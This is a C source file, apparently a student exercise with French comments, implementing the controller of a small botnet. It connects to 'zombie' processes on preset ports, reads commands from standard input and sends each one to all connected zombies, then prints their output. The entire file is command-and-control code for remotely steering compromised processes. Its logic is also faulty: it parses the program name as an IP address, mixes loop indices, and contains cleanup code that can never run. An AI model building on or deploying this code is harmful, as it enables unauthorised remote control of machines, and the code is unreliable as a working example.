#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdarg.h>
#include <time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>

#include "utils_v2.h"
#include "port.h"
#include "botNet.h"

Zombie tabZombie[BACKLOG];
struct pollfd fds[10];
volatile int numberOfZombie = 0;

void done(int sig){
	for (int i = 0; i < numberOfZombie; ++i){
		skill(tabZombie[i].pid,SIGINT);
	}
	exit(0);
}


void discussionProcess (void* commande){
	char* tabCommande = (char*)commande;
	int size = strlen(tabCommande);
	for (int i = 0; i < numberOfZombie; ++i){
		printf("%d\n",tabZombie[i].sockFd );
		swrite(fds[i].fd,tabCommande,size);
	}
	for (int i = 0; i < numberOfZombie; ++i){
		// partie a faire de manière asynch
		int numberChar2 = sread(fds[i].fd,tabCommande,256);
		printf("le resultat est :\n");
		swrite(0,tabCommande,numberChar2);
		printf("\n");
	}
	printf("\n\n\n");
}

void getPortIp(char* ip,int numberOfIp){
	int indice=0;
	for (int i = 0; i < 10; ++i){
		int sock = ssocket();
		struct sockaddr_in addr;
		memset(&addr,0,sizeof(addr)); 
		addr.sin_family = AF_INET;
		addr.sin_port = htons(tabPorts[i]);
		inet_aton(&ip[indice],&addr.sin_addr);
		int ret = connect(sock,
		 (struct sockaddr *) &addr, sizeof(addr));
		if(ret != -1){
			fds[indice].fd=sock;
			fds[i].events = POLLIN;
			indice++;
		}
	}
	 
}

int main(int argc, char *argv[])
{	
	ssigaction(SIGINT, done);
	numberOfZombie = argc-1;
	getPortIp(*argv,numberOfZombie);
	for (int i = 0; i < numberOfZombie ; ++i){
		sread(fds[i].fd,&tabZombie[i],sizeof(Zombie));
		tabZombie[i].sockController = fds[i].fd;
		printf("le controlleur ecoute sur le pid %d et le sock %d du zombie %d\n",
		 tabZombie[i].pid,tabZombie[i].sockFd,i+1);	
	}
	
	char tabCommande [256];
	while(true){
		printf("Veuillez entrez votre commande : \n");
		memset(tabCommande, 0, sizeof(tabCommande));
		sread(0,tabCommande,256);
		fork_and_run1(discussionProcess,&tabCommande);		
	}

	for (int i = 0; i < numberOfZombie; ++i){
		sclose(fds[i].fd);
	}
	// se connecte au zombie entrée en param (test tout les port du header)
	// lis une commande sur stdin et envoie a tout les zombie
	// affiche le contenu lu et les zombie connecter
	// !!! pas de blocant donc utiliser poll
	return 0;
}

